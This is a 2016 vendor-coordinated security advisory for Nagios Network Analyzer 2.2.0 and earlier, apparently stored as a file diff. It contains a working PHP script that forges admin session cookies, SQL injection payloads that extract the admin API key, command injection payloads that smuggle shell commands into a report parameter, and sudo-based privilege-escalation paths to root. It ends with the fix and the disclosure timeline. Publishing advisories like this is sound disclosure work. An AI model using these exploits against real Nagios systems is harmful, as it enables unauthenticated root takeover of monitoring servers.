@@ -1,0 +1,191 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Nagios Network Analyzer Multiple Vulnerabilities
+Affected versions: Nagios Network Analyzer <= 2.2.0
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/NagiosNetworkAnalyzerAdvisory.pdf
+
++-----------+
+|Description|
++-----------+
+The Nagios Network Analyzer application is affected by multiple security
+vulnerabilities, including authentication bypass, SQL injection,
+arbitrary code execution via command injection and privilege escalation.
+
+These vulnerabilities can be chained together to obtain unauthenticated
+remote code execution in the context of the root user.
+
++------------+
+|Exploitation|
++------------+
+==Authentication Bypass==
+Authentication for the Nagios Network Analyzer web management interface
+can be bypassed due to an insecure implementation of the function
+validating session cookies within the ‘Session.php’ file. As shown
+below, the application uses a base64 encoded serialized PHP string along
+with a SHA1 HMAC checksum as the cookie to authenticate and manage user
+sessions. A sample cookie format is shown below:
+
+ a:15:{s:10:"session_id";s:32:"325672f137d4e3747a0f9e61a4c867b2";s:10:"ip_address";s:15:"192.168.xxx.xxx";
+ s:10:"user_agent";s:72:"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0)
+Gecko/20100101 Firefox/46.0";s:13:"last_activity";
+ i:1463165417;s:9:"user_data";s:0:"";s:8:"identity";s:11:"nagiosadmin";s:8:"username";s:11:"nagiosadmin";s:5:"email";
+ s:30:"xxxxxx@security-assessment.com";s:7:"user_id";s:1:"1";s:14:"old_last_login";s:10:"1463163525";s:9:"apiaccess";
+ s:1:"1";s:6:"apikey";s:40:"6ba11d3f6e84011b3332d7427d0655de64f11d5e";s:8:"language";s:7:"default";s:10:"apisession";
+ b:1;s:7:"view_id";i:0;}<SHA1_HMAC_CHECKSUM>
+
+The application relies on the validation against the SHA1 HMAC to
+recognize and destroy invalid session cookies when the checksum value
+does not match. However the encryption key used to generate the HMAC
+checksum is statically set to the SHA1 hash value of the
+$_SERVER['HTTP_HOST'] PHP variable, which is the Host HTTP header value.
+This information can be controlled by the attacker and as such should
+not be considered a secure randomly generated value for the secret
+encryption key.
+
+Since no further verification is performed for other non-predictable
+fields (e.g. session_id, apikey, email, username etc.) and only a valid
+user agent string matching the correct HTTP header value is required, an
+attacker can forge arbitrary session cookies and bypass authentication.
+
+The script on the following page generates session cookies which are
+accepted and validated successfully by the application. A ‘user_id’
+value of 1 can be used to initiate a session in the context of the admin
+user.
+
+[POC - nagiosna_forge_cookie.php]
+<?php
+
+// Usage: php nagiosna_forge_cookie.php [TARGET_IP_ADDRESS/DOMAIN NAME]
+
+$host = $argv[1];
+
+$session =
+'a:14:{s:10:"session_id";s:32:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:10:"ip_address";
+s:15:"123.123.123.123";s:10:"user_agent";s:72:"Mozilla/5.0 (Windows NT
+6.3; WOW64; rv:46.0) Gecko/20100101
+Firefox/46.0";s:13:"last_activity";i:1463229493;s:9:"user_data";s:0:"";s:8:"identity";s:4:"XXXX";s:8:"username";
+s:4:"XXXX";s:5:"email";s:16:"test@example.com";s:7:"user_id";s:1:"1";s:14:"old_last_login";s:10:"XXXXXXXXXX";
+s:9:"apiaccess";s:1:"1";s:6:"apikey";s:40:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:8:"language";s:7:"default";
+s:10:"apisession";b:1;}';
+
+$encryption_key = sha1($host);
+
+$hmac_check = hash_hmac('sha1', $session, $encryption_key);
+
+$cookie = $session . $hmac_check;
+echo urlencode($cookie);
+
+?>
+
+This vulnerability is present across multiple Nagios products.
+
+
+==SQL Injection==
+Multiple SQL injection vulnerabilities exist in the application web
+management interface. An attacker can exploit this vulnerabilities to
+retrieve sensitive data from the application MySQL database.
+
+URL =>
+/nagiosna/index.php/api/checks/read?q%5Blastcode%5D=0&o%5Bcol%5D=<PAYLOAD>&o%5Bsort%5D=ASC
+Method => GET
+Parameter => o[col]
+POC Payload => name AND (SELECT * FROM (SELECT(SLEEP(5)))UtTW)
+
+URL =>
+/nagiosna/index.php/api/sources/read?o%5Bcol%5D=<PAYLOAD>&o%5Bsort%5D=ASC
+Method => GET
+Parameter => o[col]
+POC Payload => name AND (SELECT * FROM (SELECT(SLEEP(5)))UtTW)
+
+URL => /nagiosna/index.php/admin/globals
+Method => POST
+Parameter => timezone
+POC Payload => US/Eastern%' AND (SELECT 4646 FROM(SELECT
+COUNT(*),CONCAT(0x232323,(SELECT MID((IFNULL(CAST(apikey AS
+CHAR),0x20)),1,54) FROM nagiosna_users WHERE id=1 LIMIT
+0,1),0x232323,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS
+GROUP BY x)a) AND '%'=''
+
+
+==Command Injection==
+A command injection vulnerability exists in the function generating PDF
+reports for download. Base64 encoded user-supplied input is passed as an
+argument to system shell calls without being escaped. An attacker can
+inject arbitrary shell commands and obtain remote code execution in the
+context of the apache user.
+
+URL => /nagiosna/index.php/download/report/sourcegroup/<ID>/<BASE64
+ENCODED PAYLOAD>
+Method => GET
+POC Payload => q[rid]=5&q[gid]=1" "";{touch,/tmp/TESTFILE};echo "
+
+URL => /nagiosna/index.php/download/report/source/<ID>/<BASE64 ENCODED
+PAYLOAD>
+Method => GET
+POC Payload => q[rid]=5&q[gid]=1" "";{touch,/tmp/TESTFILE};echo "
+
+Arbitrary code execution in the context of the ‘nna’ user can also be
+obtained by abusing the intended functionality to define custom alert
+commands. As shown in the next section, this exposes the application to
+additional privilege escalation attack vectors.
+
+
+==Privilege Escalation==
+The default application sudoers configuration allows the ‘apache’ and
+‘nna’ users to run multiple Bash and Python scripts as root without
+being prompted for a password. The 'apache' user is in the 'nnacmd'
+group, which has insecure write permissions to multiple script files. An
+attacker can overwrite their contents with a malicious payload (i.e.
+spawn a shell) and escalate privileges to root.
+
+The script files with insecure permissions are listed below:
+
+PATH => /usr/local/nagiosna/bin/rc.py
+PERMISSIONS => rwxrwxr-t nna nnacmd
+
+PATH => /usr/local/nagiosna/scripts/change_timezone.sh
+PERMISSIONS => rwsrwsr-t nna nnacmd
+
+PATH => /usr/local/nagiosna/scripts/upgrade_to_latest.sh
+PERMISSIONS => rwsrwsr-t nna nnacmd
+
+
++----------+
+| Solution |
++----------+
+Upgrade to Nagios Network Analyzer 2.2.2.
+
+
++------------+
+|  Timeline  |
++------------+
+2/06/2016 – Initial disclosure to vendor
+3/06/2016 – Vendor acknowledges receipt of advisory
+3/06/2016 – Vendor releases new software build (2.2.1)
+8/07/2016 – Inform vendor about insecure fix (generation of encryption
+key based on epoch)
+9/07/2016 – Vendor confirms issue and replies with new fix
+01/08/2016 – Vendor releases patched software version
+11/08/2016 – Public disclosure
+
+
++------------+
+| Additional |
++------------+
+Further information is available in the accompanying PDF.
+http://www.security-assessment.com/files/documents/advisory/NagiosNetworkAnalyzerAdvisory.pdf
